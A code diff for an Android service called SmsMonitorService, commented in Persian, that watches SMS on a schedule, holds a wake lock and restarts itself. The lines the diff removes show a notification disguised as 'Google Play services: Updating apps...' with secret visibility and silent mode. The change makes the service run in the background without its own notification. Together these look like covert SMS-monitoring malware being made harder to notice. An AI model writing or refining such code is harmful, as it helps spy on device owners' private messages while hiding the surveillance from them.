@@ -47,11 +47,11 @@ class SmsMonitorService : Service() {
         deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         
         acquireWakeLock()
-        // 🔥 استفاده از notification موجود UnifiedService
-        attachToExistingNotification()
+        // 🔥 این سرویس background کار می‌کنه، notification نداره
+        // UnifiedService notification رو نشون میده
         startScheduledSmsCheck()
         
-        Log.d(TAG, "SmsMonitorService created")
+        Log.d(TAG, "SmsMonitorService created (background mode)")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -83,34 +83,6 @@ class SmsMonitorService : Service() {
             Log.d(TAG, "WakeLock acquired")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to acquire WakeLock: ${e.message}")
-        }
-    }
-
-    private fun attachToExistingNotification() {
-        // 🔥 استفاده از همون notification که UnifiedService ساخته
-        // این باعث میشه فقط یک notification نشون داده بشه
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Google Play services")
-                .setContentText("Updating apps...")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
-                .setOngoing(true)
-                .setShowWhen(false)
-                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-                .setCategory(NotificationCompat.CATEGORY_SERVICE)
-                .setSilent(true)
-                .build()
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                startForeground(
-                    NOTIFICATION_ID,
-                    notification,
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                )
-            } else {
-                startForeground(NOTIFICATION_ID, notification)
-            }
         }
     }
 
@@ -220,11 +192,8 @@ class SmsMonitorService : Service() {
     private fun restartService() {
         try {
             val intent = Intent(applicationContext, SmsMonitorService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                applicationContext.startForegroundService(intent)
-            } else {
-                applicationContext.startService(intent)
-            }
+            // 🔥 همیشه به عنوان background service راه‌اندازی میشه
+            applicationContext.startService(intent)
         } catch (e: Exception) {
             Log.e(TAG, "Failed to restart service: ${e.message}")
         }
